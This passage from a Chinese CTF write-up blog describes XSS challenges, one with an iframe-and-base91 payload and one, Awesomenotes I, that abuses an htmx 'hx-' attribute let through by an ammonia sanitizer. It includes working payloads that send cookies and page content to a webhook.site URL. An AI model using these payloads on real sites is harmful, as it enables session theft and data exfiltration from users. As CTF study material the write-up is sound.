punctuation">[</span><span class="token string">"getElementsByClassName"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"subtitle"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"innerHTML"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>\            fetch<span class="token punctuation">(</span>atob<span class="token punctuation">(</span><span class="token string">"aHR0cHM6Ly93ZWJob29rLnNpdGUvZTU4ZWZmYTgtZDlkOS00OGEwLTk4ZjItMjJhOTYyOTYxYzIyLw=="</span><span class="token punctuation">)</span><span class="token operator">+</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>\        <span class="token punctuation">}</span><span class="token punctuation">;</span>\        self<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"body"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"appendChild"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>f2<span class="token punctuation">)</span><span class="token punctuation">;</span>\    <span class="token punctuation">}</span><span class="token punctuation">;</span>\    self<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"body"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"appendChild"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>f1<span class="token punctuation">)</span><span class="token punctuation">;</span>\<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token number">11</span>\'<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># print(data)</span>hex_data <span class="token operator">=</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload："</span><span class="token operator">+</span>hex_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"base91编码后："</span><span class="token operator">+</span>timu<span class="token punctuation">(</span>hex_data<span class="token punctuation">)</span><span class="token punctuation">)</span>payload：f0afecd5baf36d2fe35f5153e7a98a43c1b6fdb60276742755ad32a0627856d0ca0402f620f064a525686588df5f5153e75f6b06ece8feef4301f625f0087c7f454d9d7fad19b0a34b3aa7669636c0d8fd860f381b8b7f454d9d7fad19b0a33ba90277ad4c200bb3533811b03f8155ce0e422b1308d89f406595199e15b432818760dee8ada504ad007b1088013e74affe045e2b1808d8a156e5b6562aeb09ac7276105a9940c0fe04963dae74ad561a68db6f2be0088663688fb37180edda5aa9ac27306a02f627b0ee6980b1bb4947689ebcacad95ca7a02a326607f020b5c974b5380dd038f6e70efb7ad95ca7a02a326607f02a99c09dc6fffe7bf553917b0a3a72a0e05dbf6db0ad8d17557075c69a06dbf45bfe398d27cdf32e16c1ce008f67fc7698851350ef0a16bf527f0bf452b54714512c07d9dac4294fccd80c12908bc148d3253a8d2e8a83cd74f906b9a860fbd81ba1f910cb50dff5c3f9b2ddb7c409510cfe80cac84111491d93050457600fb18f17a36def1d90cc61ce91c3722eb36c44bab5d076c6ba5b29ec02a6707a1950904ec4fe0941b8f80fd096c75d3ca4ef5aea4b6018ee0a8d9ae03b6b552594f6095b383d0ca0402f62770ca8d47c0fe04b6ba6965a77a5752db0047b0bd6cd73f1a4405311458326bbase91编码后：<span class="token operator">&lt;</span>script<span class="token operator">></span>f1<span class="token operator">=</span>self<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"createElement"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>self<span class="token punctuation">[</span><span class="token string">"f1"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"src"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"/"</span><span class="token punctuation">;</span>self<span class="token punctuation">[</span><span class="token string">"f1"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"onload"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>i<span class="token operator">=</span>self<span class="token punctuation">[</span><span class="token string">"f1"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"contentWindow"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"getElementsByTagName"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>f2<span class="token operator">=</span>self<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"createElement"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>self<span class="token punctuation">[</span><span class="token string">"f2"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"src"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"/e/"</span><span class="token operator">+</span>i<span class="token punctuation">;</span>self<span class="token punctuation">[</span><span class="token string">"f2"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"onload"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>f<span class="token operator">=</span>self<span class="token punctuation">[</span><span class="token string">"f2"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"contentWindow"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"getElementsByClassName"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"subtitle"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"innerHTML"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>fetch<span class="token punctuation">(</span>atob<span class="token punctuation">(</span><span class="token string">"aHR0cHM6Ly93ZWJob29rLnNpdGUvZTU4ZWZmYTgtZDlkOS00OGEwLTk4ZjItMjJhOTYyOTYxYzIyLw=="</span><span class="token punctuation">)</span><span class="token operator">+</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>self<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"body"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"appendChild"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>f2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>self<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"body"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"appendChild"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>f1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token number">11</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="get-flag"><a href="#get-flag" class="headerlink" title="get flag"></a>get flag</h5><p>把<code>payload</code>提上去，给<code>admin</code>举报就行了。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1697524432906.png" alt="1697524432906"></p><p>后来我发现<code>/e/</code>这个路由压根就没有鉴权机制，所以根本不用开两个<code>iframe</code>。直接一个<code>frame</code>获取<code>noteid</code>，然后访问这个<code>note</code>就可以了操。</p><pre class="line-numbers language-python"><code class="language-python">data <span class="token operator">=</span> based91<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>'<span class="token operator">&lt;</span>script<span class="token operator">></span>\f1<span class="token operator">=</span>self<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"createElement"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\    self<span class="token punctuation">[</span><span class="token string">"f1"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"src"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"/"</span><span class="token punctuation">;</span>\    self<span class="token punctuation">[</span><span class="token string">"f1"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"onload"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>\        i<span class="token operator">=</span>self<span class="token punctuation">[</span><span class="token string">"f1"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"contentWindow"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"getElementsByTagName"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>\        fetch<span class="token punctuation">(</span>atob<span class="token punctuation">(</span><span class="token string">"aHR0cHM6Ly93ZWJob29rLnNpdGUvZTU4ZWZmYTgtZDlkOS00OGEwLTk4ZjItMjJhOTYyOTYxYzIyLw=="</span><span class="token punctuation">)</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>\    <span class="token punctuation">}</span><span class="token punctuation">;</span>\    self<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"body"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"appendChild"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>f1<span class="token punctuation">)</span><span class="token punctuation">;</span>\<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token number">11</span>\'<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1697524680159.png" alt="1697524680159"></p><h4 id="Awesomenotes-I"><a href="#Awesomenotes-I" class="headerlink" title="Awesomenotes I"></a>Awesomenotes I</h4><p>这题感觉比前面那道简单多了，最起码这道题一个小时内做完了。但是考的东西比较新颖。</p><p>也是<code>note</code>题。有用的就俩函数。<code>/get_note</code>说明如果是<code>admin</code>的话就能拿到<code>flag</code>，这个<code>cookie</code>是在环境变量里的，所以根本没法伪造，她也不会给用户<code>cookie</code>。</p><pre class="line-numbers language-ruby"><code class="language-ruby">async fn <span class="token function">get_note</span><span class="token punctuation">(</span>    <span class="token function">Path</span><span class="token punctuation">(</span>note<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token constant">Path</span><span class="token operator">&lt;</span><span class="token builtin">String</span><span class="token operator">></span><span class="token punctuation">,</span>    <span class="token function">TypedHeader</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token constant">TypedHeader</span><span class="token operator">&lt;</span><span class="token constant">Cookie</span><span class="token operator">></span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token constant">Result</span><span class="token operator">&lt;</span><span class="token constant">Html</span><span class="token operator">&lt;</span><span class="token builtin">String</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token constant">StatusCode</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>'static str<span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token operator">&amp;</span>note <span class="token operator">==</span> <span class="token string">"flag"</span> <span class="token punctuation">{</span>        let <span class="token function">Some</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">=</span> cookie<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"session"</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">Err</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token constant">StatusCode</span><span class="token punctuation">:</span><span class="token symbol">:UNAUTHORIZED</span><span class="token punctuation">,</span> <span class="token string">"Missing session cookie"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> name <span class="token operator">!=</span> std<span class="token punctuation">:</span><span class="token symbol">:env</span><span class="token punctuation">:</span><span class="token symbol">:var</span><span class="token punctuation">(</span><span class="token string">"ADMIN_SESSION"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">"Missing ADMIN_SESSION"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">Err</span><span class="token punctuation">(</span><span class="token punctuation">(</span>                <span class="token constant">StatusCode</span><span class="token punctuation">:</span><span class="token symbol">:UNAUTHORIZED</span><span class="token punctuation">,</span>                <span class="token string">"You are not allowed to read this note"</span><span class="token punctuation">,</span>            <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token function">Ok</span><span class="token punctuation">(</span><span class="token function">Html</span><span class="token punctuation">(</span>fs<span class="token punctuation">:</span><span class="token symbol">:read_to_string</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">"Flag missing"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> note<span class="token punctuation">.</span><span class="token function">chars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">any</span><span class="token punctuation">(</span><span class="token operator">|</span>c<span class="token operator">|</span> <span class="token operator">!</span>c<span class="token punctuation">.</span><span class="token function">is_ascii_hexdigit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">Err</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token constant">StatusCode</span><span class="token punctuation">:</span><span class="token symbol">:BAD_REQUEST</span><span class="token punctuation">,</span> <span class="token string">"Malformed note ID"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    let <span class="token function">Ok</span><span class="token punctuation">(</span>note<span class="token punctuation">)</span> <span class="token operator">=</span> fs<span class="token punctuation">:</span><span class="token symbol">:read_to_string</span><span class="token punctuation">(</span>format<span class="token operator">!</span><span class="token punctuation">(</span><span class="token string">"public/upload/{:}"</span><span class="token punctuation">,</span> note<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">Err</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token constant">StatusCode</span><span class="token punctuation">:</span><span class="token symbol">:NOT_FOUND</span><span class="token punctuation">,</span> <span class="token string">"Note not found"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">Ok</span><span class="token punctuation">(</span><span class="token function">Html</span><span class="token punctuation">(</span>note<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>/upload_note</code>最关键的就是<code>waf</code>，只让上传<code>h1 p div</code>这三个标签，这三个标签正常来说是没法<code>xss</code>的。</p><pre class="line-numbers language-ruby"><code class="language-ruby">async fn <span class="token function">upload_note</span><span class="token punctuation">(</span>    mut multipart<span class="token punctuation">:</span> <span class="token constant">Multipart</span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token constant">StatusCode</span><span class="token punctuation">,</span> <span class="token constant">Result</span><span class="token operator">&lt;</span><span class="token constant">HeaderMap</span><span class="token operator">&lt;</span><span class="token constant">HeaderValue</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>'static str<span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    let mut body<span class="token punctuation">:</span> <span class="token constant">Option</span><span class="token operator">&lt;</span><span class="token builtin">String</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token constant">None</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> let <span class="token function">Some</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span> <span class="token operator">=</span> multipart<span class="token punctuation">.</span><span class="token function">next_field</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>await<span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        let <span class="token function">Some</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> continue <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> name <span class="token operator">!=</span> <span class="token string">"note"</span> <span class="token punctuation">{</span>            continue<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        let <span class="token function">Ok</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>await <span class="token keyword">else</span> <span class="token punctuation">{</span>            continue<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        body <span class="token operator">=</span> <span class="token function">Some</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    let <span class="token function">Some</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span> <span class="token operator">=</span> body <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token constant">StatusCode</span><span class="token punctuation">:</span><span class="token symbol">:BAD_REQUEST</span><span class="token punctuation">,</span> <span class="token function">Err</span><span class="token punctuation">(</span><span class="token string">"Malformed formdata"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> body<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5000</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token constant">StatusCode</span><span class="token punctuation">:</span><span class="token symbol">:PAYLOAD_TOO_LARGE</span><span class="token punctuation">,</span> <span class="token function">Err</span><span class="token punctuation">(</span><span class="token string">"Note too big"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    let safe <span class="token operator">=</span> ammonia<span class="token punctuation">:</span><span class="token symbol">:Builder</span><span class="token punctuation">:</span><span class="token symbol">:new</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">tags</span><span class="token punctuation">(</span>hashset<span class="token operator">!</span><span class="token punctuation">[</span><span class="token string">"h1"</span><span class="token punctuation">,</span> <span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"div"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">add_generic_attribute_prefixes</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token string">"hx-"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">clean</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>body<span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    let mut name <span class="token operator">=</span> <span class="token punctuation">[</span>0u8<span class="token punctuation">;</span> <span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    fs<span class="token punctuation">:</span><span class="token symbol">:File</span><span class="token punctuation">:</span><span class="token symbol">:open</span><span class="token punctuation">(</span><span class="token string">"/dev/urandom"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">read_exact</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mut name<span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">"Failed to read urandom"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    let name <span class="token operator">=</span> <span class="token builtin">String</span><span class="token punctuation">:</span><span class="token symbol">:from_iter</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token operator">|</span>c<span class="token operator">|</span> format<span class="token operator">!</span><span class="token punctuation">(</span><span class="token string">"{:02x}"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    fs<span class="token punctuation">:</span><span class="token symbol">:write</span><span class="token punctuation">(</span>format<span class="token operator">!</span><span class="token punctuation">(</span><span class="token string">"public/upload/{:}"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">,</span> safe<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">"Failed to write note"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span>        <span class="token constant">StatusCode</span><span class="token punctuation">:</span><span class="token symbol">:FOUND</span><span class="token punctuation">,</span>        <span class="token function">Ok</span><span class="token punctuation">(</span><span class="token constant">HeaderMap</span><span class="token punctuation">:</span><span class="token symbol">:from_iter</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span>            <span class="token constant">LOCATION</span><span class="token punctuation">,</span>            format<span class="token operator">!</span><span class="token punctuation">(</span><span class="token string">"/note/{:}"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但这句话就很奇怪，允许一个<code>hx-</code>开头的属性。这属性我这辈子都没见过。</p><pre><code>.add_generic_attribute_prefixes(&amp;[&quot;hx-&quot;])</code></pre><p>经百度得知这个属性是<code>htmx</code>的东西，然后我看了一下<code>html</code>，发现好多页面都引入了<code>htmx</code>。</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/htmx.org@1.9.5<span class="token punctuation">"</span></span> <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sha384-xcuj3WpfgjlKF+FXhSQFQ0ZNr39ln+hwjN3npfM9VBnUskLolQAcN80McRIVOPuO<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>htmx</code>是啥:</p><blockquote><p>先来看<code>HTML</code>，<code>HTML</code>的优势在于，它是一个声明式的语言，我们可以直接在html中声明我们想要的效果，而不需要去写js代码，这样就可以减少很多的代码量，同时也可以减少很多的bug。而且，html是一个很简单的语言，很多人都可以很快的上手，这样也可以减少很多的学习成本</p></blockquote><p>大概就是标签就能执行<code>js</code>了，所以<a href="https://htmx.org/reference/">读文档</a>就可以了。<code>htmx:afterRequest</code>后面写<code>js</code>就行，但是需要指定<code>hx-target</code>和<code>hx-trigger</code>。</p><p><code>dnslog</code>发现了一个更好用的<a href="https://webhook.site/">webhook</a>，支持<code>https</code>。</p><pre><code>&lt;div hx-get=&quot;https://awesomenotes.online/&quot; hx-trigger=&quot;load&quot; hx-target=&quot;this&quot;  hx-on=&quot;htmx:afterRequest: fetch(&#39;https://webhook.site/e58effa8-d9d9-48a0-98f2-22a962961c22?a=&#39;+document.cookie)&quot;&gt;Fuck you&lt;/div&gt;</code></pre><p>由于cookie没有设置<code>http only</code>，直接偷<code>cookie</code>就行，拿着<code>cookie</code>访问即可得到<code>flag</code>。</p><p>搜到一个<code>payload</code>，貌似不太稳定的样子</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span>     <span class="token attr-name">hx-get</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/api/note/flag?t<span class="token punctuation">=</span><span class="token punctuation">"</span></span>     <span class="token attr-name">hx-trigger</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>load delay:0.001s<span class="token punctuation">"</span></span>    <span class="token attr-name">hx-target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#report<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    get flag<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span>     <span class="token attr-name">hx-get</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>YOUR_SERVER<span class="token punctuation">"</span></span>     <span class="token attr-name"><span class="token namespace">hx-on:</span>:config-request</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>event.detail.parameters[<span class="token punctuation">'</span>flag<span class="token punctuation">'</span>] <span class="token punctuation">=</span> document.getElementById(<span class="token punctuation">'</span>report<span class="token punctuation">'</span>).innerHTML<span class="token punctuation">"</span></span>    <span class="token attr-name">hx-trigger</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>load delay:0.8s<span class="token punctuation">"</span></span>    <span class="token attr-name">hx-target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#report<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    send flag<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2023-web题解</title>
      <link href="/2023/10/31/actf-web/"/>
      <url>/2023/10/31/actf-web/</url>
      
